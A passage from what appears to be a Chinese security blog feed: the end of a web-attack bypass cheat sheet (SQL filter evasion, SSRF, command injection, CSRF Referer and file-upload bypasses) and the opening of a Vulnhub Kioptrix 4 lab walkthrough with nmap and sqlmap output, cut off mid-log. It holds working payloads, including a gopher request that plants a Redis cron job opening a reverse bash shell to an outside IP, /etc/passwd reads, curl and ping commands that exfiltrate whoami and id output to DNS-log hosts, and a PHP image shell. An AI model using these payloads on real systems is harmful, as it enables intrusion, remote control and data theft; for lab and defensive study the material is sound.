<h4><span id="等价函数替换">等价函数替换</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"> </span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"> </span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"> substr((select &apos;password&apos;),1,1) = 0x70</span><br><span class="line"> </span><br><span class="line">　　　strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line"> </span><br><span class="line">　　   strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line"> </span><br><span class="line">　　　strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"> </span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"> </span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>
<h2><span id="ssrf">SSRF</span></h2><h3><span id="限制协议绕过">限制协议绕过</span></h3><p>通过HTTP(S)的链接302跳转到gopher协议上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;s&apos;];</span><br><span class="line">$ip     = $_GET[&apos;i&apos;];</span><br><span class="line">$port   = $_GET[&apos;p&apos;];</span><br><span class="line">$query  = $_GET[&apos;q&apos;];</span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol - 探测Redis</span><br><span class="line">dict://127.0.0.1:6379/info  </span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</span><br><span class="line"></span><br><span class="line"># file protocol - 任意文件读取</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># gopher protocol - 一键反弹Bash</span><br><span class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </span><br><span class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </span><br><span class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</span><br><span class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
<h3><span id="ip限制绕过">IP限制绕过</span></h3><h4><span id="利用">利用[::]</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
<p>在windows尝试了<code>chrome Firefox IE</code>都无法访问</p>
<p>在Linux下<code>Firefox</code>是可以访问的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_1.png" alt=""></p>
<p>Linux下<code>curl wget</code>也是可以访问的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_2.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_3.png" alt=""></p>
<h4><span id="利用">利用@</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1   =&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
<p>在<code>firefox</code>下会弹出提示框。<code>chrome</code>直接跳转。</p>
<h4><span id="利用短地址">利用短地址</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
<h4><span id="利用xipio和xipname">利用xip.io和xip.name</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">mysite.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">foo.bar.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name  resolves to  10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.2.xip.name  resolves to  10.0.0.2</span><br><span class="line"></span><br><span class="line">foo.10.0.0.3.xip.name  resolves to  10.0.0.3</span><br><span class="line"></span><br><span class="line">bar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_4.png" alt=""></p>
<h4><span id="利用dns解析">利用DNS解析</span></h4><p>在域名上设置A记录，指向127.0.1</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_5.png" alt=""></p>
<h4><span id="利用进制转换">利用进制转换</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">十进制 ---||||||&gt; 十六进制 ---||||||&gt; 八进制 然后在访问时 指定协议然后加个0</span><br><span class="line"></span><br><span class="line">http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！</span><br><span class="line"></span><br><span class="line">(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)</span><br><span class="line"></span><br><span class="line">首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！</span><br><span class="line"></span><br><span class="line">结果：16373751032</span><br><span class="line"></span><br><span class="line">然后指定协议 http:// 用0表示前缀 加上结果 链接：</span><br><span class="line"></span><br><span class="line">http://0016373751032</span><br></pre></td></tr></table></figure>
<h4><span id="利用enclosed-alphanumerics">利用Enclosed alphanumerics</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_6.png" alt=""></p>
<h4><span id="利用句号">利用句号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_7.png" alt=""></p>
<h2><span id="命令执行">命令执行</span></h2><h4><span id="空格绕过">空格绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt; 符号</span><br><span class="line"></span><br><span class="line">%09 符号</span><br><span class="line"></span><br><span class="line">IFS$9 符号</span><br><span class="line"></span><br><span class="line">$&#123;IFS&#125; 符号</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%0a 符号</span><br><span class="line"></span><br><span class="line">%0d 符号</span><br><span class="line"></span><br><span class="line">%09 符号</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_2.png" alt=""></p>
<h4><span id="变量形式绕过">变量形式绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=who;b=am;c=i;$a$b$c</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_3.png" alt=""></p>
<h4><span id="base64编码">base64编码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;d2hvYW1p&quot;|base64 -d`</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_4.png" alt=""></p>
<h4><span id="dns通道获取回显">DNS通道获取回显</span></h4><p>linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line"></span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_1.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_2.png" alt=""></p>
<p>特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_3.png" alt=""></p>
<p>windows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http请求：</span><br><span class="line">for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%x</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_4.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_5.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F &quot;delims=&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.t00ls.xxx.tu4.org</span><br><span class="line">获取用户名：for /F &quot;delims= tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.t00ls.xxx.tu4.org</span><br></pre></td></tr></table></figure>
<p>用<code>ceye.io</code>获取不到回显，尝试了用t00ls的<code>T00ls DNSLOG</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_6.png" alt=""></p>
<h4><span id="单引号和双引号">单引号和双引号</span></h4><p>单引号双引号要成对出现</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bash_1.png" alt=""></p>
<h2><span id="csrf-绕过referer">CSRF 绕过Referer</span></h2><p>条件限制 不一定所有的Refere验证就可以绕过</p>
<h4><span id="referer为空条件下">Referer为空条件下</span></h4><p>利用ftp://,<a href="http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的" target="_blank" rel="noopener">http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的</a></p>
<p>如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p>
<p>利用https协议  https向http跳转的时候Referer为空</p>
<h4><span id="判断referer是某域情况下绕过">判断Referer是某域情况下绕过</span></h4><p>比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  </p>
<p>可以找个二级域名 之后<img "csrf地址"="">  之后在把文章地址发出去 就可以伪造。</p>
<h4><span id="判断referer是否存在某关键词">判断Referer是否存在某关键词</span></h4><p>referer判断存在不存在google.com这个关键词  </p>
<p>在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过 </p>
<h4><span id="判断referer是否有某域名">判断referer是否有某域名</span></h4><p>判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com </p>
<p>那么我这里可以构造子域名x.126.com.xxx.com </p>
<h2><span id="文件上传">文件上传</span></h2><h3><span id="解析漏洞">解析漏洞</span></h3><h4><span id="iis60解析漏洞">IIS6.0解析漏洞</span></h4><p>IIS6.0会把以下3种类型的文件会被IIS当作脚本文件(ASP、PHP、ASPX)来解析执行</p>
<ul>
<li><p>a.asp;.jpg</p>
</li>
<li><p>/a.asp/2018042500310015.jpg</p>
</li>
<li><p>a.cer、a.asa、a.cdx  IIS6.0会把这三种后缀当作ASP来执行。</p>
</li>
</ul>
<h4><span id="apache解析漏洞">Apache解析漏洞</span></h4><p>在低版本的Apache中，系统会从右向左识别后缀，直至找到一个可以识别的后缀，然后将文件以该可识别的后缀进行解析。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell.php.v1.xxx</span><br><span class="line"></span><br><span class="line">-- 系统无法识别xxx后缀名，则判断v1后缀名</span><br><span class="line">-- 系统仍无法识别v1后缀名，则判断php后缀名</span><br><span class="line">-- 系统可识别php后缀名，则将文件作为PHP文件解析</span><br></pre></td></tr></table></figure>
<h4><span id="nginx解析漏洞">Nginx解析漏洞</span></h4><p>Nginx&lt;=0.8.37，在已上传到服务器的包含WEBSHELL代码的图片后面加上%00.php会将 /xx.jpg%00.php当作PHP文件来进行解析执行。</p>
<h4><span id="cgi解析漏洞">CGI解析漏洞</span></h4><p> CGI的解析漏洞主要影响IIS&gt;7.0 和 Nginx 这两个WEB容器，它的产生原因是因为PHP.ini中cgi.fix_pathinfo=1，从而导致把其他格式文件按照PHP脚本来进行解析执行。</p>
<p>  Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/图片马地址/a.php</span><br></pre></td></tr></table></figure>
<p>遇到这种环境，攻击者只需要找到一个上传点，然后上传一个图片马，然后访问图片构造Payload即可获取WEBSHELL。但此情景只能以PHP脚本解析执行文件。</p>
<h4><span id="客户端检测绕过javascript检测">客户端检测绕过（JavaScript检测）</span></h4><p>这类检测通常在上传页面里含有专门检测文件上传的javascript代码最常见的就是检测扩展名是否合法</p>
<p>可以用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交</p>
<p>用burp进行代理修改先将文件扩展名改成jpg</p>
<h4><span id="服务端检测绕过mime检测">服务端检测绕过（MIME检测）</span></h4><p>MIME验证是通过获取上传文件时数据包中Content-Type的值来判断文件是否合法的。以下是常见图片的后缀和Content-Type对应表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">后缀   Content-Type</span><br><span class="line"></span><br><span class="line">.jpg   image/jpeg</span><br><span class="line">.gif   image/gif</span><br><span class="line">.png   image/png</span><br></pre></td></tr></table></figure>
<p>MIME验证只需要攻击者抓取上传数据包，将数据包中的Content-Type的值修改为合法图片的Content-Type值即可绕过。</p>
<h4><span id="服务端检测绕过目录路径检测">服务端检测绕过（目录路径检测）</span></h4><p>目录路径检测，一般就检测路径是否合法</p>
<p>洞成因是因为对目录路径的检测不够严谨而导致可以用0x00截断进行攻击</p>
<h4><span id="服务端检测绕过文件扩展名检测">服务端检测绕过(文件扩展名检测)</span></h4><ul>
<li><p>文件名大小写绕过</p>
</li>
<li><p>名单列表绕过</p>
</li>
<li><p>特殊文件名绕过</p>
</li>
<li><p>0x00截断绕过</p>
</li>
<li><p>htaccess文件攻击</p>
</li>
<li><p>解析调用/漏洞绕过</p>
</li>
</ul>
<h4><span id="服务端检测绕过文件内容检测">服务端检测绕过(文件内容检测)</span></h4><ul>
<li>文件幻数检测</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/huanshu_1.png" alt=""></p>
<ul>
<li>文件相关信息检测</li>
</ul>
<p>图像文件相关信息检测常用的就是getimagesize()函数只需要把文件头部分伪造好就ok了，</p>
<p>就是在幻数的基础上还加了一些文件信息有点像下面的结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...somebinarydataforimage...)</span><br><span class="line">&lt;?phpphpinfo();?&gt;</span><br><span class="line">(...skippingtherestofbinarydata...)</span><br></pre></td></tr></table></figure>
<ul>
<li>文件加载检测</li>
</ul>
<p>常见的是图像渲染测试，再变态点的甚至是进行二次渲染</p>
<p>对渲染/加载测试的攻击方式是代码注入绕过</p>
<p>对二次渲染的攻击方式是攻击文件加载器自身</p>
<p>渲染/加载测试攻击-代码注入绕过</p>
<p>可以用图像处理软件对一张图片进行代码注入</p>
<p>用winhex看数据可以分析出这类工具的原理是</p>
<p>在不破坏文件本身的渲染情况下</p>
<p>找一个空白区进行填充代码，</p>
<p>一般会是图片的注释区对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Vulnhub渗透测试练习-Kioptrix 4]]></title>
      <url>https://uknowsec.cn/posts/uncategorized/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-4.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="信息收集">信息收集</span></h3><p>用<code>nmap</code>进行端口扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 10.32.58.187</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 01:57 EDT</span><br><span class="line">Nmap scan report for 10.32.58.187</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2018-05-17T09:58:07-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 10.32.58.187</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds</span><br></pre></td></tr></table></figure>
<p>从扫描结果可以得到，开发以下端口信息</p>
<ul>
<li>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li>
<li>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li>
<li>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</li>
<li>445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</li>
</ul>
<p>访问80端口下的WEB服务。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_1.png" alt=""></p>
<p>尝试万能密码绕过<code>&#39;or 1=1#</code> 绕过失败。</p>
<p>弱密码<code>admin:admin</code>也是错误的。</p>
<p>尝试<code>admin:&#39;</code>，出现报错。好爆出来了路径<code>/var/www/checklogin.php</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_2.png" alt=""></p>
<p>存在POST型注入。</p>
<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="sqlmap进行sql注入">sqlmap进行SQL注入</span></h3><p><code>sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --current-user --current-db --is-dba</code></p>
<p>在注入的过程会遇到<code>302跳转</code>选择<code>n</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:00:45] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">[02:00:45] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[02:00:45] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[02:00:45] [INFO] fetching current database</span><br><span class="line">[02:00:45] [INFO] retrieved: members</span><br><span class="line">current database:    &apos;members&apos;</span><br><span class="line">[02:00:45] [INFO] testing if current user is DBA</span><br><span class="line">[02:00:45] [INFO] 